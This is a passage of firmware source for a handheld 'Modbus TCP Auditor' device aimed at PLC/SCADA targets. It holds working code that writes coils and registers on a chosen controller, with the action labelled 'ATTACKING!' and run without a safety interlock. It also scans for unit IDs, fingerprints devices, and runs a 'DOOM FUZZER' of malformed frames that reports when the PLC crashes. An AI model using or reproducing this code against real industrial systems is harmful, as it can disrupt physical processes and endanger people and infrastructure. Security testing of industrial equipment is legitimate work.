void drawValueEditor() {
  canvas.fillScreen(BLACK); drawBattery(&canvas, true); M5.Imu.update(); auto imu = M5.Imu.getImuData();
  tiltBackward = (abs(imu.accel.x) > 0.4 || abs(imu.accel.y) > 0.4); 
  canvas.setTextDatum(MC_DATUM);
  if (tiltBackward) { canvas.setTextColor(TERM_RED); canvas.drawString("<<", 200, 60, 2);
  } else { canvas.setTextColor(TERM_GREEN);
  canvas.drawString(">>", 200, 60, 2); }
  canvas.setTextDatum(TC_DATUM); canvas.setTextColor(TERM_ORANGE); canvas.drawString("EDIT HOLDING REG", 120, 10, 2); 
  canvas.setTextDatum(MC_DATUM); canvas.setTextColor(WHITE);
  
  char valBuf[32];
  snprintf(valBuf, sizeof(valBuf), "%d", globalWriteValue);
  canvas.drawString(valBuf, 120, 60, 4);
  
  canvas.setTextDatum(BC_DATUM); canvas.setTextColor(TERM_GREEN); canvas.drawString("A: +/-1 | A(L): +/-100", 120, 115, 2);
  canvas.setTextColor(CYAN);
  canvas.drawString("B(L): Save & Exit", 120, 135, 2); canvas.pushSprite(0,0);
  
  if (M5.BtnA.wasClicked()) { 
    if (tiltBackward) { globalWriteValue--;
    if (globalWriteValue < 0) globalWriteValue = 65535;
    } else { globalWriteValue++; if (globalWriteValue > 65535) globalWriteValue = 0;
    } 
  }
  if (M5.BtnA.pressedFor(500)) { 
    if (tiltBackward) { globalWriteValue -= 100;
    if (globalWriteValue < 0) globalWriteValue = 65535; } else { globalWriteValue += 100; if (globalWriteValue > 65535) globalWriteValue = 0;
    } delay(50);
  }
  if (M5.BtnB.pressedFor(500)) { 
    canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_GREEN); canvas.drawString("SAVING...", 120, 67, 4); canvas.pushSprite(0,0);
    while (M5.BtnB.isPressed()) { M5.update(); yield(); } currentState = STATE_TARGET_MENU;
  }
}

// ==========================================
// 11. READ/WRITE UI (CONTROLLER)
// ==========================================
void drawControllerUI(bool readBatHardware) { 
 canvas.fillScreen(BLACK);
 canvas.setTextDatum(TL_DATUM); canvas.setTextColor(TERM_GREEN);
 canvas.drawString("TGT: " + foundTargets[selectedTargetIndex].ip.toString(), 0, 0, 2); canvas.drawLine(0, 18, 240, 18, TERM_GREEN); 
 
 canvas.setTextDatum(TC_DATUM); 
 String label = "";
 uint16_t color = WHITE;
 switch (currentMode) { 
   case MODE_READ_COIL:       label = "READ COILS"; color = TERM_BLUE; break; 
   case MODE_WRITE_COIL_ON:   label = "WRITE COIL: ON"; color = TERM_RED; break;
   case MODE_WRITE_COIL_OFF:  label = "WRITE COIL: OFF"; color = TERM_RED; break;
   case MODE_READ_DISC_IN:    label = "READ DISC INPUTS"; color = TERM_ORANGE; break;
   case MODE_READ_H_REG:      label = "READ HOLDING REG"; color = TERM_BLUE; break;
   case MODE_WRITE_H_REG:     
        char lblBuf[32];
        snprintf(lblBuf, sizeof(lblBuf), "WRITE: %d", globalWriteValue);
        label = lblBuf; color = TERM_RED; break;
   case MODE_READ_I_REG:      label = "READ INPUT REG"; color = TERM_ORANGE; break; 
 }
 canvas.setTextColor(color);
 canvas.drawString(label, 120, 22, 2); 
 
 char telemetria[64];
 snprintf(telemetria, sizeof(telemetria), "UNIT ID: %d | TX: %u", targetUnitID, currentTransactionID);
 canvas.setTextColor(TERM_GRAY);
 canvas.drawString(telemetria, 120, 40, 2);
 int finalAddr = pageBase + addrOffset;
 char addrText[32];
 snprintf(addrText, sizeof(addrText), "< ADDR: %d >", finalAddr);
 canvas.setTextColor(TERM_ORANGE);
 canvas.setTextFont(4);
 canvas.drawString(addrText, 120, 60);
 
 // State and Values Logic Feedback
 if (statusMsg == "READY" && lastReadValue == -1) {
     canvas.setTextColor(TERM_GRAY);
     canvas.drawString("READY", 120, 88);
     canvas.setTextFont(2);
 } else if (lastActionSuccess || (statusMsg == "- READY -" && lastReadValue != -1)) {
     canvas.setTextColor(TERM_GREEN);
     if (isWriteMode(currentMode)) {
         canvas.drawString("OK", 120, 88);
     } else {
         char valText[32];
         snprintf(valText, sizeof(valText), "VAL: %d (RAW)", lastReadValue);
         canvas.drawString(valText, 120, 88);
     }
     canvas.setTextFont(2);
 } else {
     canvas.setTextColor(TERM_RED);
     canvas.setTextFont(4);
     canvas.drawString(statusMsg, 120, 88);
     canvas.setTextFont(2);
 }

 canvas.setTextDatum(MC_DATUM); 
 if (tiltBackward) { canvas.setTextColor(TERM_RED); canvas.drawString("<<", 220, 75, 2);
 } else { canvas.setTextColor(TERM_GREEN);
 canvas.drawString(">>", 220, 75, 2); }

 if (isAttacking) { 
   canvas.setTextDatum(BC_DATUM);
   if (isWriteMode(currentMode)) { canvas.setTextColor(TERM_RED);
   canvas.drawString("ATTACKING! [ B: STOP ]", 120, 135, 2);
   } else { canvas.setTextColor(TERM_BLUE); canvas.drawString("MONITORING [ B: STOP ]", 120, 135, 2);
   } 
 } else { 
   canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
   canvas.drawString("A: +/-Addr | A(L): +/-Pg | B: Run", 120, 135, 2); 
 }
 drawBattery(&canvas, readBatHardware); canvas.pushSprite(0, 0);
}

void handleNavigation() {
 // 1. OT INACTIVITY WATCHDOG
 if (isAttacking && (millis() - lastActivityTime > OT_SESSION_TIMEOUT)) {
   isAttacking = false;
   netClient->stop(); 
   statusMsg = "TIMEOUT (SAFE)"; lastReadValue = -1; lastActionSuccess = false; 
   drawControllerUI(true); return;
 }

 if (M5.BtnB.pressedFor(800) && !isAttacking) { 
   canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE); canvas.drawString("DISCONNECTING...", 120, 67, 2); canvas.pushSprite(0,0); netClient->stop();
   isAttacking = false; currentState = STATE_AUDITOR_MENU; while (M5.BtnB.isPressed()) { M5.update(); yield(); } return;
 }
 
 if (!isAttacking) {
   lastActivityTime = millis();
   // Reset Watchdog on idle state
   
   static unsigned long lastImuTime = 0;
   if (millis() - lastImuTime > 150) { 
     lastImuTime = millis(); M5.Imu.update(); auto imu = M5.Imu.getImuData();
     bool currentTilt = (abs(imu.accel.x) > 0.4 || abs(imu.accel.y) > 0.4);
     if (currentTilt != tiltBackward) { 
       tiltBackward = currentTilt;
       canvas.fillRect(205, 55, 35, 40, BLACK);
       canvas.setTextDatum(MC_DATUM); 
       if (tiltBackward) { canvas.setTextColor(TERM_RED); canvas.drawString("<<", 220, 75, 2); } else { canvas.setTextColor(TERM_GREEN);
       canvas.drawString(">>", 220, 75, 2);
       } 
       canvas.pushSprite(0,0);
     } 
   }
   if (M5.BtnA.wasClicked()) { 
     if (tiltBackward) { 
       addrOffset--;
       if (addrOffset < 0) { addrOffset = 9; pageBase -= 10; if (pageBase < 0) pageBase = 9990;
       }
     } else { 
       addrOffset++;
       if (addrOffset > 9) { addrOffset = 0; pageBase += 10; if (pageBase > 9990) pageBase = 0;
       }
     } 
     statusMsg = "READY"; lastReadValue = -1; drawControllerUI(true);
   }
   if (M5.BtnA.pressedFor(800)) { 
     if (netClient->connected()) netClient->stop();
     if (tiltBackward) { pageBase -= 10;
     if (pageBase < 0) pageBase = 9990; } else { pageBase += 10; if (pageBase >= 10000) pageBase = 0;
     } 
     canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(WHITE);
     if (tiltBackward) { canvas.drawString("<< PREV ADDRESS RANGE", 120, 67, 2);
     } else { canvas.drawString("NEXT ADDRESS RANGE >>", 120, 67, 2); } 
     canvas.pushSprite(0,0); delay(200);
     addrOffset = 0; statusMsg = "READY"; lastReadValue = -1;
     while (M5.BtnA.isPressed()) { M5.update(); yield(); } drawControllerUI(true);
   }
   
   // Direct execution trigger without Safety Interlock check
   if (M5.BtnB.wasReleased()) { 
       isAttacking = true;
       drawControllerUI(true);
   }
   
 } else { 
   if (M5.BtnB.wasReleased()) { 
       isAttacking = false;
       statusMsg = "READY"; lastActionSuccess = false;
       lastReadValue = -1; netClient->stop(); drawControllerUI(true);
   } 
 }
 if (isAttacking) { 
   executeAction();
   static unsigned long lastUIUpdate = 0;
   bool updateBat = (millis() - lastUIUpdate > 3000); if (updateBat) lastUIUpdate = millis(); drawControllerUI(updateBat);
   delay(250);
 }
}

void executeAction() {
 IPAddress ip = foundTargets[selectedTargetIndex].ip; uint16_t port = COMMON_PORTS[selectedPortIndex];

 if (!netClient->connected()) { 
   netClient->stop();
   // CRITICAL: Prevent W5500 socket resource exhaustion upon ungraceful disconnects
   if (!netClient->connect(ip, port)) { statusMsg = "CONN ERROR";
   lastActionSuccess = false; isAttacking = false;
   lastReadValue = -1; return;
   } 
 }
 
 // DESYNC PATCH: Flush RX buffer to clean up stray bytes from previous malformed requests
 int flushLimit = 256;
 while(netClient->available() && flushLimit-- > 0) { netClient->read(); } 

 currentTransactionID++; uint8_t frame[12];
 frame[0] = (currentTransactionID >> 8) & 0xFF;
 frame[1] = currentTransactionID & 0xFF; frame[2] = 0;
 frame[3] = 0; frame[4] = 0; frame[5] = 6; frame[6] = targetUnitID;
 uint8_t funcCode; uint16_t val = 0;
 int finalAddr = pageBase + addrOffset;
 switch (currentMode) { 
   case MODE_READ_COIL:       funcCode = 0x01; val = 1; break; 
   case MODE_WRITE_COIL_ON:   funcCode = 0x05; val = 0xFF00; break;
   case MODE_WRITE_COIL_OFF:  funcCode = 0x05; val = 0x0000; break; 
   case MODE_READ_DISC_IN:    funcCode = 0x02; val = 1; break;
   case MODE_READ_H_REG:      funcCode = 0x03; val = 1; break;
   case MODE_WRITE_H_REG:     funcCode = 0x06; val = globalWriteValue; break;
   case MODE_READ_I_REG:      funcCode = 0x04; val = 1; break; 
 }
 frame[7] = funcCode;
 frame[8] = (finalAddr >> 8) & 0xFF; frame[9] = finalAddr & 0xFF; frame[10] = (val >> 8) & 0xFF;
 frame[11] = val & 0xFF; 
 netClient->write(frame, 12); unsigned long s = millis();
 while (netClient->available() == 0) { if (millis() - s > 2000) { statusMsg = "TIMEOUT"; lastActionSuccess = false;
 lastReadValue = -1; netClient->stop(); return; } }
 uint8_t resp[512]; memset(resp, 0, sizeof(resp)); int bytesLeidos = 0;
 while (millis() - s < 1500) {
     while (netClient->available() > 0 && bytesLeidos < 512) { resp[bytesLeidos++] = netClient->read(); }
     if (bytesLeidos >= 6) {
         uint16_t expectedPayloadLen = (resp[4] << 8) | resp[5]; int totalExpectedBytes = 6 + expectedPayloadLen;
         if (bytesLeidos >= totalExpectedBytes) break;
     } delay(5);
 }
 delay(10);
 if (bytesLeidos >= 8) {
   // DESYNC PATCH: Validate corresponding Transaction ID to avoid staggered response processing
   uint16_t rxTxID = (resp[0] << 8) | resp[1];
   if (rxTxID != currentTransactionID) {
       statusMsg = "DESYNC ERR";
       lastActionSuccess = false;
       lastReadValue = -1; 
       netClient->stop(); 
       return;
   }

   if (resp[7] == (funcCode | 0x80)) { 
     char errBuf[16];
     snprintf(errBuf, sizeof(errBuf), "ERR: %X", resp[8]);
     statusMsg = errBuf;
     lastActionSuccess = false; lastReadValue = -1; netClient->stop();
   } else { 
     lastActionSuccess = true;
     statusMsg = "SENT OK";
     if (bytesLeidos > 9) { 
       if (currentMode == MODE_READ_COIL || currentMode == MODE_READ_DISC_IN) { lastReadValue = (resp[9] & 0x01);
       } else if (currentMode == MODE_READ_H_REG || currentMode == MODE_READ_I_REG) { lastReadValue = (resp[9] << 8) | resp[10];
       } 
     } else if (!isWriteMode(currentMode)) { statusMsg = "BAD RESP";
     } 
     if (isWriteMode(currentMode)) lastReadValue = -1;
   }
 } else { statusMsg = "BAD RESP";
 lastActionSuccess = false; lastReadValue = -1; netClient->stop(); }
}

// ==========================================
// 12. ACTIVE AUDITING & EXPLOITATION TOOLS
// ==========================================
void executeFingerprint() {
  canvas.fillScreen(BLACK);
  drawBattery(&canvas, true); canvas.setTextDatum(TC_DATUM); canvas.setTextColor(TERM_ORANGE);
  canvas.drawString("FINGERPRINTING...", 120, 40, 2); canvas.pushSprite(0,0);
  
  IPAddress ip = foundTargets[selectedTargetIndex].ip; 
  uint16_t port = COMMON_PORTS[selectedPortIndex];
  String strVendor = "-"; String strProductCode = "-"; String strRevision = "-"; 
  String strVendorUrl = "-"; String strProductName = "-";
  bool connSuccess = false; int latencyMs = 0; unsigned long startPing = millis();
  
  if (!netClient->connected()) netClient->stop();
  // CRITICAL: Prevent resource leaking
  bool isConnected = false;
  
  // Tactical connection loop: Apply 3 retries with pacing (OT Safe)
  for (int i = 0; i < 3; i++) {
    if (netClient->connect(ip, port)) {
      isConnected = true;
      break;
    }
    delay(200); 
  }
  
  if (isConnected) {
    netClient->setTimeout(2); connSuccess = true;
    uint8_t frame[] = {0, 1, 0, 0, 0, 5, targetUnitID, 0x2B, 0x0E, 0x02, 0x00}; 
    netClient->write(frame, 11);
    unsigned long s = millis();
    
    while (netClient->available() == 0) { if (millis() - s > 2000) break; } delay(50);
    if (netClient->available()) {
      uint8_t buff[512]; memset(buff, 0, sizeof(buff)); int bytesLeidos = 0;
      unsigned long readStart = millis();
      
      while (millis() - readStart < 1500) {
          while (netClient->available() > 0 && bytesLeidos < 512) { buff[bytesLeidos++] = netClient->read(); }
          if (bytesLeidos >= 6) { 
              uint16_t expectedPayloadLen = (buff[4] << 8) | buff[5]; 
              if (bytesLeidos >= 6 + expectedPayloadLen) break; 
          } 
          delay(5);
      }
      
      // 1. MODBUS EXCEPTION INTERCEPTION (OT SAFEGUARD)
      if (bytesLeidos >= 9 && buff[7] == 0xAB) {
          strVendor = "NOT SUPPORTED (EXC)";
          strProductCode = "N/A";
          strRevision = "N/A";
          strVendorUrl = "N/A";
          strProductName = "N/A";
      } 
      // 2. STRICT MEMORY PARSING FOR MEI RESPONSES
      else if (bytesLeidos > 14 && buff[7] == 0x2B && buff[8] == 0x0E) {
        int numObjects = buff[13];
        int currentPos = 14; 
        for (int i = 0; i < numObjects; i++) {
          if (currentPos >= bytesLeidos) break;
          uint8_t objId = buff[currentPos]; 
          
          if (currentPos + 1 >= bytesLeidos) break;
          uint8_t objLen = buff[currentPos + 1];
          if (currentPos + 2 + objLen > bytesLeidos) break;
          
          String tempStr = "";
          for (int j = 0; j < objLen; j++) { 
            // Direct access using safe offsets to prevent premature pointer advancing
            char c = (char)buff[currentPos + 2 + j];
            if (c >= 32 && c <= 126) tempStr += c;
          } 
          tempStr.trim();
          
          if (objId == 0x00) strVendor = tempStr;
          else if (objId == 0x01) strProductCode = tempStr; 
          else if (objId == 0x02) strRevision = tempStr;
          else if (objId == 0x03) strVendorUrl = tempStr; 
          else if (objId == 0x04) strProductName = tempStr;
          
          // Mathematically advance the pointer safely
          currentPos += (2 + objLen);
        }
      } else { 
          strVendor = "RAW HEX ERR";
      }
    } else { strVendor = "TIMEOUT";
    } 
    
    latencyMs = millis() - startPing;
    int flushLimit = 256;
    while(netClient->available() > 0 && flushLimit-- > 0) { netClient->read(); yield(); } 
    netClient->stop();
  } else { strVendor = "CONN FAILED"; }
  
  if (strVendor.length() > 20) strVendor = strVendor.substring(0, 20);
  if (strProductCode.length() > 20) strProductCode = strProductCode.substring(0, 20);
  if (strRevision.length() > 20) strRevision = strRevision.substring(0, 20);
  if (strVendorUrl.length() > 24) strVendorUrl = strVendorUrl.substring(0, 24);
  if (strProductName.length() > 20) strProductName = strProductName.substring(0, 20);
  
  unsigned long lastBatUpdate = 0; bool showPage2 = false; bool forceRedraw = true;
  while (true) { 
    M5.update();
    if (M5.BtnB.pressedFor(800)) { 
      canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE);
      canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0); 
      while(M5.BtnB.isPressed()) { M5.update(); yield(); } break;
    }
    if (M5.BtnA.wasReleased()) { showPage2 = !showPage2; forceRedraw = true;
    }
    
    if (millis() - lastBatUpdate > 5000 || forceRedraw) {
      lastBatUpdate = millis();
      forceRedraw = false; 
      canvas.fillScreen(BLACK); drawBattery(&canvas, true); canvas.setTextDatum(TC_DATUM); 
      if (connSuccess) canvas.setTextColor(TERM_GREEN); else canvas.setTextColor(TERM_RED);
      if (!showPage2) canvas.drawString("IDENTITY (1/2)", 120, 5, 2);
      else canvas.drawString("IDENTITY (2/2)", 120, 5, 2); 
      
      canvas.setTextDatum(TL_DATUM);
      if (!showPage2) { 
        canvas.setTextColor(TERM_GRAY);
        canvas.drawString("VENDOR: ", 5, 30, 2); 
        canvas.setTextColor(WHITE); canvas.drawString(strVendor, 75, 30, 2); 
        canvas.setTextColor(TERM_GRAY); canvas.drawString("PROD.CODE: ", 5, 60, 2); 
        canvas.setTextColor(TERM_BLUE);
        canvas.drawString(strProductCode, 90, 60, 2); 
        canvas.setTextColor(TERM_GRAY); canvas.drawString("REV: ", 5, 90, 2); 
        canvas.setTextColor(TERM_ORANGE); canvas.drawString(strRevision, 45, 90, 2);
      } else { 
        canvas.setTextColor(TERM_GRAY); canvas.drawString("URL: ", 5, 30, 2); 
        canvas.setTextColor(TERM_BLUE);
        canvas.drawString(strVendorUrl, 45, 30, 2); 
        canvas.setTextColor(TERM_GRAY); canvas.drawString("NAME:", 5, 60, 2); 
        canvas.setTextColor(TERM_ORANGE); canvas.drawString(strProductName, 55, 60, 2);
        if (connSuccess) { 
            canvas.setTextColor(TERM_GRAY);
            canvas.drawString("LAT: ", 5, 90, 2); 
            canvas.setTextColor(WHITE); 
            char latBuf[32]; snprintf(latBuf, sizeof(latBuf), "%d ms", latencyMs);
            canvas.drawString(latBuf, 45, 90, 2);
        }
      }
      canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
      canvas.drawString("A: Page | B(L): Back", 120, 135, 2); canvas.pushSprite(0,0);
    } 
    delay(20);
  } 
  currentState = STATE_TARGET_MENU;
}

void executeUnitIDScan() {
  IPAddress ip = foundTargets[selectedTargetIndex].ip; 
  uint16_t port = COMMON_PORTS[selectedPortIndex]; 
  std::vector<int> foundIDs;
  
  if (!netClient->connected()) netClient->stop(); // CRITICAL socket check
  
  if (!netClient->connect(ip, port)) { 
    canvas.fillScreen(BLACK);
    canvas.drawString("CONN ERROR", 120, 60, 4);
    canvas.pushSprite(0,0); delay(1000); 
    currentState = STATE_TARGET_MENU; return;
  }
  
  int fallosDeConexionConsecutivos = 0;
  for (int id = 0; id <= 255; id++) { 
    M5.update();
    if (!isNetworkConnected()) { netClient->stop();
    currentState = STATE_WIFI_LOST; return; }
    
    if (M5.BtnB.pressedFor(800)) { 
      canvas.fillScreen(BLACK);
      canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_RED);
      canvas.drawString("STOPPING IDs SCANNING...", 120, 67, 2); 
      canvas.pushSprite(0,0); 
      while (M5.BtnB.isPressed()) { M5.update(); yield(); } break;
    }
    
    if (!netClient->connected()) {
        netClient->stop();
        if (!netClient->connect(ip, port)) {
            fallosDeConexionConsecutivos++;
            if (fallosDeConexionConsecutivos >= 3) {
                canvas.fillScreen(BLACK);
                canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_RED); 
                canvas.drawString("HOST DEAD", 120, 60, 4); 
                canvas.pushSprite(0,0); delay(1500); break;
            } 
            continue;
        } 
        delay(10);
    } 
    fallosDeConexionConsecutivos = 0;
    
    if (id % 10 == 0) { 
      canvas.fillScreen(BLACK); canvas.setTextDatum(TC_DATUM); canvas.setTextColor(TERM_ORANGE);
      canvas.drawString("SCANNING IDs...", 120, 10, 2); 
      canvas.setTextDatum(MC_DATUM); canvas.setTextColor(WHITE); 
      
      int endRange = id + 9; if (endRange > 255) endRange = 255;
      char idBuf[32]; snprintf(idBuf, sizeof(idBuf), "Checking: %d-%d", id, endRange);
      canvas.drawString(idBuf, 120, 65, 4);
      canvas.fillRect(0, 105, map(id, 0, 255, 0, 240), 5, TERM_BLUE);
      canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN); 
      canvas.drawString("B(L): Stop Scan", 120, 135, 2); canvas.pushSprite(0,0);
    }
    
    int flushLimit = 256;
    while(netClient->available() && flushLimit-- > 0) { netClient->read(); }
    
    uint8_t frame[] = {0, 0, 0, 0, 0, 6, (uint8_t)id, 0x03, 0x00, 0x00, 0x00, 0x01};
    netClient->write(frame, 12);
    unsigned long s = millis(); bool response = false;
    
    while (millis() - s < 150) { 
        if (netClient->available()) { 
            uint8_t respBuffer[16];
            int rLen = 0; delay(10); 
            while(netClient->available() && rLen < 16) { respBuffer[rLen++] = netClient->read(); }
            if (rLen >= 9) {
                bool isException = (respBuffer[7] & 0x80);
                uint8_t expCode = respBuffer[8];
                if (!(isException && (expCode == 0x0A || expCode == 0x0B))) {
                    response = true;
                }
            }
            flushLimit = 256;
            while (netClient->available() && flushLimit-- > 0) { netClient->read(); } 
            break;
        } 
    } 
    if (response) foundIDs.push_back(id);
    
    // OT SAFEGUARD: Implement Pacing / Anti-DoS
    // Allows the PLC's internal TCP stack to breathe and reclaim dead sockets.
    delay(25); 
  } 
  
  netClient->stop();
  int scanSelectionIndex = 0; bool localTilt = false;
  
  while (true) { 
    M5.update(); M5.Imu.update(); auto imu = M5.Imu.getImuData();
    localTilt = (abs(imu.accel.x) > 0.4 || abs(imu.accel.y) > 0.4);
    
    if (M5.BtnA.wasClicked() && !foundIDs.empty()) { 
      if (localTilt) { scanSelectionIndex--;
      if (scanSelectionIndex < 0) scanSelectionIndex = foundIDs.size() - 1; } 
      else { scanSelectionIndex++;
      if (scanSelectionIndex >= foundIDs.size()) scanSelectionIndex = 0; }
    }
    if (M5.BtnB.wasReleased()) { if (!foundIDs.empty()) { targetUnitID = foundIDs[scanSelectionIndex];
    } break; }
    if (M5.BtnB.pressedFor(800)) { 
      canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE);
      canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0); 
      while (M5.BtnB.isPressed()) { M5.update(); yield(); } break;
    }
    
    canvas.fillScreen(BLACK); drawBattery(&canvas, true); canvas.setTextDatum(TC_DATUM);
    canvas.setTextColor(TERM_GREEN); canvas.drawString("ID SELECTION", 120, 5, 2);
    
    if (foundIDs.empty()) { 
        canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_RED); canvas.drawString("NO IDs FOUND", 120, 60, 4);
    } else { 
        canvas.setTextDatum(MC_DATUM); canvas.setTextColor(WHITE); 
        int currentID = foundIDs[scanSelectionIndex];
        char selIdBuf[32];
        snprintf(selIdBuf, sizeof(selIdBuf), "ID: %d", currentID);
        canvas.drawString(selIdBuf, 120, 52, 4); 
        
        const char* idLabel = "STANDARD"; uint16_t labelColor = TERM_GREEN;
        if (currentID == 0) { idLabel = "BROADCAST"; labelColor = TERM_ORANGE; } 
        else if (currentID >= 248 && currentID <= 255) { idLabel = "RESERVED"; labelColor = TERM_RED; }

        canvas.setTextColor(labelColor); canvas.drawString(idLabel, 120, 75, 2);
        canvas.setTextColor(TERM_GRAY);
        char foundCntBuf[32];
        snprintf(foundCntBuf, sizeof(foundCntBuf), "Found: %d", foundIDs.size());
        canvas.drawString(foundCntBuf, 120, 95, 2);
        
        if (localTilt) { canvas.setTextColor(TERM_RED); canvas.drawString("<<", 200, 60, 2); } 
        else { canvas.setTextColor(TERM_GREEN); canvas.drawString(">>", 200, 60, 2); }
    }
    canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN);
    canvas.drawString("A: Change | B: Set | B(L): Back", 120, 135, 2); canvas.pushSprite(0,0); delay(20);
  } 
  currentState = STATE_TARGET_MENU;
}

void executeFuzzer() {
  IPAddress ip = foundTargets[selectedTargetIndex].ip; uint16_t port = COMMON_PORTS[selectedPortIndex]; long packetCount = 0;
  canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_RED);
  canvas.drawString("STARTING STRESS TEST", 120, 67, 2); canvas.pushSprite(0,0); delay(1000);
  while (true) { 
    M5.update();
    // Yield hardware watchdog processor
    yield(); 

    if (M5.BtnB.wasPressed()) { netClient->stop();
      canvas.fillScreen(BLACK); canvas.setTextColor(TERM_GREEN);
      canvas.drawString("TEST STOPPED", 120, 75, 2); canvas.pushSprite(0,0); while(M5.BtnB.isPressed()) { M5.update(); yield(); } delay(500); break;
    }
    if (!netClient->connected()) { 
        netClient->stop(); // CRITICAL socket check
        netClient->connect(ip, port);
    }
    if (netClient->connected()) {
      packetCount++;
      int fuzzType = esp_random() % 3;
      uint8_t buffer[256]; int len = 0;
      
      // FUZZER EFFICACY PATCH: Always generate valid MBAP headers to force parsing on the OT Application Layer
      uint16_t transId = esp_random() % 65535;
      buffer[0] = transId >> 8; buffer[1] = transId & 0xFF; // Transaction ID
      buffer[2] = 0x00; buffer[3] = 0x00; // Protocol ID (Modbus = 0)
      buffer[6] = targetUnitID; // Unit ID
      
      if (fuzzType == 0) { 
          // Type 0: Random Function Code, Random Length Data
          int payloadLen = (esp_random() % 100) + 2;
          buffer[4] = payloadLen >> 8; buffer[5] = payloadLen & 0xFF; // Length
          buffer[7] = esp_random() % 256; // Random Function
          for (int i = 0; i < payloadLen - 2; i++) buffer[8 + i] = esp_random() % 256;
          len = 6 + payloadLen;
      }
      else if (fuzzType == 1) { 
          // Type 1: Read Holding Registers requesting excessive quantity (Illegal)
          buffer[4] = 0x00;
          buffer[5] = 0x06; // Length
          buffer[7] = 0x03; // Function 3
          buffer[8] = esp_random() % 256;
          buffer[9] = esp_random() % 256; // Random Start Addr
          buffer[10] = 0x02;
          buffer[11] = 0x00; // Requests 512 registers (Legal Max = 125)
          len = 12;
      }
      else { 
          // Type 2: Write Multiple Registers with corrupted byte count
          buffer[4] = 0x00;
          buffer[5] = 0x0B; // Length 11 bytes
          buffer[7] = 0x10; // Function 16
          buffer[8] = esp_random() % 256;
          buffer[9] = esp_random() % 256; // Addr
          buffer[10] = 0x00;
          buffer[11] = 0x02; // Quantity 2
          buffer[12] = 0x04; // Byte count claims 4 bytes
          buffer[13] = esp_random() % 256;
          buffer[14] = esp_random() % 256;
          buffer[15] = esp_random() % 256; buffer[16] = esp_random() % 256;
          // Inject intentional junk padding to force parser desynchronization
          len = 17 + (esp_random() % 5);
      }
      netClient->write(buffer, len); netClient->flush();
    }
    if (!netClient->connected()) {
        netClient->stop(); // CRITICAL
        if (!netClient->connect(ip, port)) {
            canvas.fillScreen(BLACK);
            canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_GREEN); canvas.drawString("TARGET DOWN!", 120, 50, 4); canvas.setTextColor(WHITE); canvas.drawString("PLC/Service Crashed", 120, 80, 2); canvas.pushSprite(0,0);
            while(!M5.BtnB.wasPressed()) { M5.update(); delay(10); } netClient->stop();
            break;
        }
    }
    if (packetCount % 50 == 0) { 
      canvas.fillScreen(BLACK);
      drawBattery(&canvas, true); canvas.setTextDatum(TC_DATUM); canvas.setTextColor(TERM_RED); canvas.drawString("!!! DOOM FUZZER !!!", 120, 5, 2); 
      canvas.setTextDatum(MC_DATUM); canvas.setTextColor(WHITE); canvas.drawString("PKTS SENT:", 120, 60, 2); canvas.setTextFont(4);
      char pktBuf[32]; snprintf(pktBuf, sizeof(pktBuf), "%ld", packetCount);
      canvas.drawString(pktBuf, 120, 80); canvas.setTextFont(0); 
      
      canvas.setTextDatum(BC_DATUM); canvas.setTextColor(CYAN); canvas.drawString("PRESS B TO STOP", 120, 135, 2); canvas.pushSprite(0,0);
    } delay(10);
  } currentState = STATE_TARGET_MENU;
}

// ==========================================
// 13. INITIALIZATION AND AP CONFIGURATION
// ==========================================
void showIntro() {
 M5.Lcd.fillScreen(BLACK); M5.Lcd.setTextColor(TERM_RED); M5.Lcd.setTextFont(1);
 M5.Lcd.setCursor(0, 0);
 M5.Lcd.println(R"(
  [==================================]
  |                                  |
  |            MODBUS TCP            |
  |           AUDITOR TOOL           |
  |                                  |
  |    [||||]    TARGET: PLC/SCADA   |
  |    [....]    STATUS: HUNTING     |
  |    [____]                        |
  |                                  |
  |            by z4y_d3n            |
  |                                  |
  [==================================]
  ************************************
 )");
 int yBar = 120; M5.Lcd.drawRect(40, yBar, 160, 8, WHITE); 
 for (int i = 0; i < 156; i += 2) { M5.Lcd.fillRect(42 + i, yBar + 2, 2, 4, TERM_GREEN);
 delay(32); } delay(1000); 
}

void setupAPAndServer() {
  WiFi.mode(WIFI_AP); String randomPin = String(10000000 + (esp_random() % 90000000));
  WiFi.softAP(AP_SSID, randomPin.c_str(), 1, false, 1);
  server.on("/", handleWebRoot); server.on("/save", handleWebSave); server.begin(); 
  wifiConfigMode = true; currentState = STATE_WIFI_CONFIG;
  canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_RED);
  canvas.drawString("WIFI CONFIG MODE", 120, 20, 2); 
  canvas.setTextColor(TERM_GREEN); canvas.drawString("AP: " + String(AP_SSID), 120, 50, 2);
  canvas.drawString("PASS: " + randomPin, 120, 70, 2); 
  canvas.setTextColor(WHITE); canvas.drawString("IP: 192.168.4.1", 120, 100, 2); canvas.setTextColor(TERM_ORANGE); canvas.drawString("Waiting for config...", 120, 125, 1);
  canvas.pushSprite(0,0);
}

void handleWebRoot() {
  String html = "<html><body style='background-color:#000; color:#0f0; font-family:monospace; text-align:center;'>"
                "<h1>M5 AUDITOR SETUP</h1><form action='/save' method='POST'>SSID: <input type='text' name='ssid'><br><br>"
                "PASS: <input type='password' name='pass'><br><br><input type='submit' value='SAVE & REBOOT' style='background:#f00; color:#fff; border:none; padding:10px;'>"
                "</form></body></html>";
  server.send(200, "text/html", html);
}

void handleWebSave() {
  String s = server.arg("ssid"); String p = server.arg("pass");
